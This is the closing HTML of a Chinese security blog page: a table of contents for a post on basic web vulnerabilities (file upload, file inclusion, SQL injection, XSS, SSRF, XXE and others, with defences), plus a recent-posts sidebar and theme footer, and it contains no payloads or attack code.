class="toc-text">上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%A7%A3%E6%9E%90%EF%BC%88javascript%EF%BC%89"><span class="toc-text">客户端解析（javascript）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E6%9E%90"><span class="toc-text">服务端解析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MIME%E7%B1%BB%E5%9E%8B"><span class="toc-text">MIME类型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-text">目录路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8B%93%E5%B1%95%E5%90%8D"><span class="toc-text">文件拓展名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-text">文件内容</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toc-text">相关配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-quotes-gpc"><span class="toc-text">magic_quotes_gpc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-fopen"><span class="toc-text">allow_url_fopen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-include"><span class="toc-text">allow_url_include</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">包含一些敏感的配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">包含用户上传文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">包含日志文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%ABSession"><span class="toc-text">包含Session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">包含临时文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6"><span class="toc-text">包含数据库、缓存文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB-proc-self-environ"><span class="toc-text">包含&#x2F;proc&#x2F;self&#x2F;environ</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-text">php:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip-amp-bzip2-amp-zlib"><span class="toc-text">zip:&#x2F;&#x2F;&amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http-amp-https"><span class="toc-text">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RFI"><span class="toc-text">RFI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行&#x2F;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLI"><span class="toc-text">SQLI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">数据库类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL"><span class="toc-text">PostgreSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB"><span class="toc-text">MongoDB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-text">参数过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ODBC"><span class="toc-text">ODBC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PDO"><span class="toc-text">PDO</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-1"><span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-2"><span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-3"><span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-text">危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-4"><span class="toc-text">防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP"><span class="toc-text">JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SOME%E6%94%BB%E5%87%BB"><span class="toc-text">SOME攻击</span></a></li></ol></li></ol></li></ol>
    </div>
</aside>
                
                

            
                
            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2022/04/22/CVE-2020-1938%E5%A4%8D%E7%8E%B0/"><i class="fa  fa-book"></i> CVE-2020-1938复现</a>
            
          
        
          
          
            <a class="list-group-item" href="/2022/03/17/WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"><i class="fa  fa-book"></i> WEB基础漏洞</a>
            
          
        
          
          
            <a class="list-group-item" href="/2022/02/20/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fa  fa-book"></i> BUUCTF做题记录（一）</a>
            
          
        
          
          
            <a class="list-group-item" href="/2022/02/20/Linux%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84-proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8/"><i class="fa  fa-book"></i> Linux系统中的/proc目录作用</a>
            
          
        
          
          
            <a class="list-group-item" href="/2022/02/15/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa  fa-book"></i> CTFHub-Web-文件上传</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/10vexh"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2023 10vexh's Blog. 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by 10vexh.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

        <script defer src="https://unpkg.com/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="https://unpkg.com/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


    <script async src="/js/candy.min.js"></script>



    <script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="3204190542"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="https://unpkg.com/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>


    <script defer src="/js/kr-dark.min.js"></script>



<!-- Extra support for third-party plguins  -->


    </body>
</html>